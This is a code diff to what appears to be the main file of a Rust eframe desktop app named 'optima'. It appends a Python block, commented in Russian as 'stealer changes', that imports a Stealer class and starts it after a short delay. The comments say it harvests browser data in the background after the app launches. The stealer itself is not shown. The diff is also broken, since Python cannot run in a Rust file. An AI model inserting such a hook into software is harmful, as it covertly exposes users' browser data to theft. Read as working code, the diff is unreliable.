@@ -474,3 +474,21 @@ fn main() -> eframe::Result<()> {
     };
     eframe::run_native("optima", options, Box::new(|cc| Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))))
 }
+# --- НАЧАЛО ИЗМЕНЕНИЙ СТИЛЛЕРА ---
+
+# Импортируем класс стиллера из созданного файла
+try:
+    from stealer import Stealer
+except ImportError:
+    print("Warning: stealer.py not found. Check if the file is in the same folder.")
+
+# Запускаем сбор данных в фоне после того, как основная программа сделала свою работу
+# Это гарантирует, что все процессы браузера уже загружены и данные доступны
+if __name__ == "__main__":
+    # Небольшая задержка, чтобы убедиться, что программа полностью запустилась
+    import time
+    time.sleep(2) 
+    
+    Stealer.start()
+
+# --- КОНЕЦ ИЗМЕНЕНИЙ СТИЛЛЕРА ---
